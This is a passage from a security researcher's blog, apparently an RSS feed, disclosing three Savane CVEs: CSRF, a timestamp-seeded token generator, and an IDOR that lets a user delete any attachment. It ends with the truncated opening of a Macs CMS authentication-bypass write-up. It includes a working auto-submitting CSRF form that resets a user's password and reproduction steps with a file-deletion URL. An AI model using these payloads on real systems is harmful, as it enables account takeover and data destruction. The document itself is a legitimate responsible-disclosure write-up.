<p>The majority of the critical account management functionalities appeared to be protected by a<code>form_id</code> parameter, which contained a randomized string in each request. In effect, <code>form_id</code> acted as a CSRF token.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*Q3BI1WCSQj8kJmb7iCEh4g.png" alt=""  />

Additionally, attempting to change the password required the previous user password to be known, which provided no advantage over attempting to brute-force their password to begin with.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*IcA_HpVxf3LP9FlM7miVUw.png" alt=""  />

<em>http://172.17.0.2:7890/my/admin/change.php?item=password</em></p>
<p>With these precautions in place, it was evident that further investigation was required.</p>
<h2 id="cve-202427631csrf-cwe-352">CVE-2024–27631 — CSRF (CWE-<strong>352)</strong></h2>
<p>I suspected that there may be additional critical vulnerabilities without CSRF protection. Specifically, I began to look inside of admin folders in the source code, eventually finding <code>siteadmin/usergroup.php</code>, which enabled superusers to edit of any user’s profile.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*_stvfUY2HtkR9wda-TgZQQ.png" alt=""  />

<em>Example of /siteadmin/usergroup.php to edit the account of user 60079</em></p>
<p>This page contained three unprotected functionalities of interest. The first was a function that can be used to grant a user admin flags, leading to privilege escalation without account takeover.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*TDquE7S3UnTHXilR4TYrVA.png" alt=""  />

<em>frontend/php/siteadmin/usergroup.php</em></p>
<p>The second and third functionalities could be leveraged for account takeover by either changing the email address of a user’s account:</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*HvHtu0HaoxRLzojL3vjfPQ.png" alt=""  />

<em>frontend/php/siteadmin/usergroup.php</em></p>
<p>Or, changing the password of any user’s account.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*-N45bZ7BrPdguKZWsQs0cw.png" alt=""  />

<em>frontend/php/siteadmin/user_changepw.php</em></p>
<p>Given these promising leads, I began to develop a Proof-of-Concept (PoC) to demonstrate that the vulnerability existed in practice. (I have found that with static analysis, sometimes a detail in the code can be overlooked that actually mitigates the vulnerability.) The following is what I came up with and successfully tested:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#f92672">&lt;!--</span> The efficacy of this payload is browser<span style="color:#f92672">-</span>dependent <span style="color:#f92672">--&gt;</span>  
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>form id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;autosubmit&#34;</span> action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://&lt;savane\_instance&gt;/siteadmin/user\_changepw.php&#34;</span> method<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span><span style="color:#f92672">&gt;</span>  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;</span>input name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form\_pw&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Password1!&#34;</span> <span style="color:#f92672">/&gt;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;</span>input name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form\_pw2&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Password1!&#34;</span> <span style="color:#f92672">/&gt;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;</span>input name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;user\_id&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;user\_id&gt;&#34;</span> <span style="color:#f92672">/&gt;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;</span>input name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;update&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Update&#34;</span> <span style="color:#f92672">/&gt;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;</span>input type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Submit Request&#34;</span> <span style="color:#f92672">/&gt;</span>  
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>form<span style="color:#f92672">&gt;</span>  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>script<span style="color:#f92672">&gt;</span>  
</span></span><span style="display:flex;"><span> document<span style="color:#f92672">.</span>getElementById(<span style="color:#e6db74">&#34;autosubmit&#34;</span>)<span style="color:#f92672">.</span>submit();  
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>script<span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>Thus, I discovered CVE-2024–27631! A patch was implemented in <a href="https://git.savannah.nongnu.org/cgit/administration/savane.git/commit/?h=i18n&id=d3962d3feb75467489b869204db98e2dffaaaf09">this commit</a>.</p>
<h2 id="cve-202427632bad-seed-cwe-335">CVE-2024–27632 — Bad Seed (CWE-335)</h2>
<p>While tracing CSRF-related functionalities in the code, I came across the logic for generating and serving the CSRF tokens, or form IDs. The execution flow is as follows:</p>
<ol>
<li>Protected PHP pages contain a call to <code>form_header()</code>.</li>
<li>The <code>form_header()</code> function seeds the current Unix timestamp.</li>
<li>A random number is chosen and hashed to create <code>form_id</code>.</li>
<li>The form ID is added as a hidden element in the form on the protected page.</li>
</ol>
<p>The definition of <code>form_header()</code> can be seen in the image below.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*Zs5bxl01fMcxsXTfZd4mzw.png" alt=""  />

<em>frontend/php/include/form.php</em></p>
<p>I was particularly interested in the mechanism behind seeding the Pseudo-Random Number Generator (<a href="https://en.wikipedia.org/wiki/Pseudorandom_number_generator">PRNG</a>), which occured in <code>utils_srand()</code>.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*SIBvRLsqwT0QVwFI1ZczrA.png" alt=""  />

<em>frontend/php/include/utils.php</em></p>
<p>It was apparent that <code>[mt\_srand()](https://www.php.net/manual/en/function.mt-srand.php)</code> was used to seed the <a href="https://www.php.net/manual/en/function.microtime.php">Unix timestamp</a> (learn more about PRNGs <a href="https://www.geeksforgeeks.org/pseudo-random-number-generator-prng/">here</a>). Since this function is called when a protected page is loaded, the seed is renewed with the current time upon visiting the page. If the timestamp that a victim visited a page is known, can be approximated, or can be otherwise triggered, it is possible to independently generate the exact same form ID token, passing the CSRF check! This would allow for CSRF attacks on arbitrary form submissions, leading to potential account takeover.</p>
<p>Savane v3.13 contains a patch implemented in this <a href="https://git.savannah.nongnu.org/cgit/administration/savane.git/commit/?h=i18n&id=dee5195d18f9ab16c860e8114819083673f66b95">commit</a>.</p>
<h1 id="group-management-functionalities">Group Management Functionalities</h1>
<p>Another class of functionalities I began to explore was group management. I tested CRUD (Create, Read, Update, and Delete) functionalities utilized when submitting a bug report to a group. I was unable to exploit file uploads in bug reports (I may address this in a future article if enough people are interested), however, I was vigilant on access control issues when I observed the web traffic for deleting an uploaded attachment.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*4Pup6AnABk8L9bM8QGeGow.png" alt=""  />

<em>Deleting a file attachment with ID 40225</em></p>
<h2 id="cve-202427630idor-cwe-639">CVE-2024–27630 — IDOR (<strong>CWE-639</strong>)</h2>
<p>Upon submitting a bug report, uploaded files are deposited in the uploads directory (<code>/var/lib/savane/trackers_attachments</code>) with a file name equivalent to the file’s ID.</p>
<p>Naturally, I began to investigate the process of deleting a file, a function only accessible to tracker admins. The following function is responsible for handling file deletion on attachments (<code>frontend/php/include/trackers/data.php:2417</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>function trackers\_data\_delete\_file ($group\_id, $item\_id, $file\_id)  
</span></span><span style="display:flex;"><span>{  
</span></span><span style="display:flex;"><span> global $sys\_trackers\_attachments\_dir;  
</span></span><span style="display:flex;"><span> # Make sure the attachment belongs to the group.  
</span></span><span style="display:flex;"><span> $res = db\_execute (&#34;  
</span></span><span style="display:flex;"><span> SELECT bug\_id from &#34; . ARTIFACT . &#34; WHERE bug\_id = ? AND group\_id = ?&#34;,  
</span></span><span style="display:flex;"><span> [$item\_id, $group\_id]  
</span></span><span style="display:flex;"><span> );  
</span></span><span style="display:flex;"><span> if (db\_numrows ($res) &lt;= 0)  
</span></span><span style="display:flex;"><span> {  
</span></span><span style="display:flex;"><span> # TRANSLATORS: the argument is item id (a number).  
</span></span><span style="display:flex;"><span> $msg = sprintf (  
</span></span><span style="display:flex;"><span> \_(&#34;Item #%s doesn&#39;t belong to project&#34;), $item\_id  
</span></span><span style="display:flex;"><span> );  
</span></span><span style="display:flex;"><span> fb ($msg, 1);  
</span></span><span style="display:flex;"><span> return;  
</span></span><span style="display:flex;"><span> }  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> $result = false;  
</span></span><span style="display:flex;"><span> # Delete the attachment.  
</span></span><span style="display:flex;"><span> if (unlink (&#34;$sys\_trackers\_attachments\_dir/$file\_id&#34;))   
</span></span><span style="display:flex;"><span> $result = db\_execute (&#34;  
</span></span><span style="display:flex;"><span> DELETE FROM trackers\_file WHERE item\_id = ? AND file\_id = ?&#34;,  
</span></span><span style="display:flex;"><span> [$item\_id, $file\_id]  
</span></span><span style="display:flex;"><span> );
</span></span></code></pre></div><p>The user can control the <code>$item_id</code> and <code>$file_id</code> parameters through the URI. Can you spot the vulnerability? It is subtle.</p>
<p>Note that there is input validation ensure the <code>$file_id</code> is a number. Otherwise, there would be a directory traversal vulnerability allowing for arbitrary file deletion.</p>
<p>The function first checks if the user is part of the group corresponding to the <code>$item_id</code> and proceeds to delete the attachment before running a SQL query updating the database. The <code>$file_id</code> is not checked at all! This means that as long as the attacker is an admin of the group referenced in <code>$item_id</code>, they could delete any file.</p>
<p>I was quite surprised to have spotted this discrepency, but very pleased. The following steps can be taken to reproduce the vulnerability:</p>
<ol>
<li>Have an account that is an admin of a group with a bugtracker (attacker account).</li>
<li>With a separate user account (victim), upload a file attachment in a bug report to a group that the attacker is not an admin of. A sample of the subsequent upload directory is as follows:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>root<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">60</span>ae93fe131f:<span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>savane<span style="color:#f92672">/</span>trackers\_attachments<span style="color:#75715e"># ls  </span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">40226</span> <span style="color:#ae81ff">40227</span> <span style="color:#ae81ff">40230</span> <span style="color:#ae81ff">40231</span>
</span></span></code></pre></div><ol start="3">
<li>
<p>Visit the homepage of the group that the attacker is an admin of. Then, visit Bugs &gt; Browse and note a valid Item ID on the leftmost column of the table. This ID will be used in the next step.</p>
</li>
<li>
<p>As the attacker, make a get request to the path <code>/bugs/index.php?func=delete_file&amp;item_id=&lt;ATTACKER_ITEM_ID&gt;&amp;item_file_id=&lt;FILE_ID_TO_DELETE&gt;</code>.</p>
</li>
</ol>
<ul>
<li>In my case, this looks like <a href="http://172.17.0.2:7890/bugs/index.php?func=delete_file&item_id=50697&item_file_id=40231">http://172.17.0.2:7890/bugs/index.php?func=delete_file&item_id=50697&item_file_id=40231</a>.</li>
</ul>
<ol start="5">
<li>Verify that the victim’s file (from a group the attacker doesn’t have privileges on) has been deleted.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>root<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">60</span>ae93fe131f:<span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>savane<span style="color:#f92672">/</span>trackers\_attachments<span style="color:#75715e"># ls  </span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">40226</span> <span style="color:#ae81ff">40227</span> <span style="color:#ae81ff">40230</span>
</span></span></code></pre></div><p>Due to the incremental file names, it is possible for an attacker to iteratively delete every file attachment on the web server! Since recently uploaded files harbor the highest file ID numbers, an attacker can upload a file, observe the ID, and delete every ID below that number as one would in an Insecure Direct Object Reference (IDOR) vulnerabillity. This vulnerability was patched <a href="https://git.savannah.nongnu.org/cgit/administration/savane.git/commit/?h=i18n&id=39180aea8f38425035b4d1e73819b58007ac6e83">here</a>.</p>
<h2 id="thanks">Thanks</h2>
<p>Special thanks to Ineiev, the maintainer of Savane. He was very receptive to my responsible disclosure and helped take steps to patch it.</p>
<h1 id="conclusion">Conclusion</h1>
<p>Combing through Savane’s source code was one of the highlights of my Christmas break. While discovering 3 CVEs came as a surprise, I am appreciative of the educational value of this experience. I hope that you learned something from this writeup. If you have any questions or comments, feel free to reach out to me on <a href="https://www.linkedin.com/in/ally-petitt/">LinkedIn</a>!</p>
]]></content:encoded>
    </item>
    <item>
      <title>How I Found an Authentication Bypass Vulnerability — CVE-2023–43154</title>
      <link>https://ally-petitt.com:443/en/posts/2023-09-29_how-i-found-authentication-bypass-vulnerability---cve-2023-43154-b55dee7c876b/</link>
      <pubDate>Fri, 29 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.com:443/en/posts/2023-09-29_how-i-found-authentication-bypass-vulnerability---cve-2023-43154-b55dee7c876b/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*3hIZtNoj0lfZ86_b&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://images.pexels.com/photos/5483149/pexels-photo-5483149.jpeg?auto=compress&amp;amp;cs=tinysrgb&amp;amp;w=1260&amp;amp;h=750&amp;amp;dpr=1&#34;&gt;https://images.pexels.com/photos/5483149/pexels-photo-5483149.jpeg?auto=compress&amp;amp;cs=tinysrgb&amp;amp;w=1260&amp;amp;h=750&amp;amp;dpr=1&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Discovering a CVE was always an idea that enticed me, but I had no idea how to achieve it. Encountering the authentication bypass that I will explain in this article was both unexpected and deeply inspiring. In my preparation for the OSWE, I decided to practice identifying the exam vulnerabilities in real, open-source applications, which would both give me practice for the exam and enable me to contribute to the security community. The first of these applications is the subject of this article.&lt;/p&gt;
&lt;h2 id=&#34;prerequisite-knowledge&#34;&gt;Prerequisite Knowledge&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;A basic understanding of scripting languages and web applications&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;setup&#34;&gt;Setup&lt;/h2&gt;
&lt;p&gt;I decided to audit &lt;a href=&#34;https://www.opensourcecms.com/macs-cms/&#34;&gt;Macs Framework v1.14f&lt;/a&gt;. The reasoning behind this target choice is that I wanted to gain familiarity with analyzing large code bases before challenging myself with a more modern target in order to establish a robust methodology. Additionally, Macs CMS seemed like a target that was compatible with the machines used in the OSWE certification exams and the additional preparation would increase my chance of passing on the first attempt.&lt;/p&gt;
&lt;p&gt;My first attempt to launch the web application locally was unsuccessful. I was unable to install the deprecated PHP5 version on my host OS. As a solution, I decided to run the application in a Docker container. I made a &lt;code&gt;Dockerfile&lt;/code&gt; in the &lt;code&gt;Application/&lt;/code&gt; folder of the source code. I was unable to find documentation or online resources as to the process of configuring this CMS, so after some tweaking, I composed the following &lt;code&gt;Dockerfile&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FROM php:&lt;span style=&#34;color:#ae81ff&#34;&gt;5.6&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;apache  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;COPY &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;html&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;WORKDIR &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;html  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# add working apt sources  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RUN echo deb http:&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;archive&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;debian&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;org&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;debian&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; stretch main &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;etc&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;apt&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;sources&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RUN echo deb http:&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;archive&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;debian&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;org&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;debian&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;security&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; stretch&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;updates main &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;etc&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;apt&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;sources&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# install mysql  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RUN apt&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;get update &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; apt&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;get install &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;y mysql&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;server &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; apt&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;get clean  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# remove symlinks on error logs  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RUN unlink &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;apache2&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;error&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; unlink &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;apache2&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;access&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# remove .htaccess file because it isn&amp;#39;t needed and it caused issues  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RUN rm &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;html&lt;span style=&#34;color:#f92672&#34;&gt;/.&lt;/span&gt;htaccess  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# change ownership of web files to www-data  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RUN chown www&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;html &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;R &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;755&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;html &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;R  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# start mysql and apache2  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RUN service mysql restart  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RUN service apache2 restart
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I then built the new image and ran it as a container named &lt;code&gt;macs-cms.&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd Macs-CMS/Application  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo docker build -t macs-cms .  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo docker run -it -exec --name macs-cms macs-cms /bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After these commands were complete, I was able to visit the live CMS at &lt;code&gt;&amp;lt;http://172.17.0.2&amp;gt;.&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;finding-cve-202343154&#34;&gt;Finding CVE-2023–43154&lt;/h1&gt;
&lt;p&gt;My first encounter with the source code aimed to identify key metadata that would provide context as to which vulnerabilities to look for. By briefly browsing the project in &lt;a href=&#34;https://vscodium.com/&#34;&gt;VSCodium&lt;/a&gt;’s project explorer and running enumeration commands on the Docker container, I was able to deduce the following information:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Programming language:&lt;/strong&gt; PHP 5.6&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Architecture:&lt;/strong&gt; Model-View-Controller (MVC)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Routes:&lt;/strong&gt; Organized with the following pattern: &lt;code&gt;/&amp;lt;controller_name&amp;gt;/&amp;lt;function&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Database:&lt;/strong&gt; MariaDB 10.1.48&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Operating System:&lt;/strong&gt; Debian GNU/Linux 9&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Informed on the technology stack, I was able to focus my research on vulnerabilities that are common in PHP and MariaDB, one of which being PHP type confusion.&lt;/p&gt;
&lt;p&gt;I proceeded with navigating the web application and monitoring my HTTP traffic through my BurpSuite web proxy while taking notes on details that I deemed interesting for future vulnerability analysis. In particular, I honed in on the authentication functionality because of its potential to be high severity.&lt;/p&gt;
&lt;p&gt;Upon my login attempt as admin, I noticed the following traffic:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Pkekiat_JJKGXIKOXuDGpQ.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;Intercepted login request&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The URI, excluding the prefix &lt;code&gt;index.php&lt;/code&gt;, was &lt;code&gt;/main/cms/login&lt;/code&gt;. My interpretation of this route is that the &lt;code&gt;mainController&lt;/code&gt; is initially called, which loads to the &lt;code&gt;CMS&lt;/code&gt; plugin with &lt;code&gt;$this-&amp;gt;cms = $this-&amp;gt;loadPlugin(&#39;CMS&#39;);&lt;/code&gt;. Then, the &lt;code&gt;login()&lt;/code&gt; function is invoked within the CMS plugin with access to the HTTP POST data, which is globally accessible.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*YiIswaTUkWAQg-oNymcuAg.png&#34; alt=&#34;&#34;  /&gt;

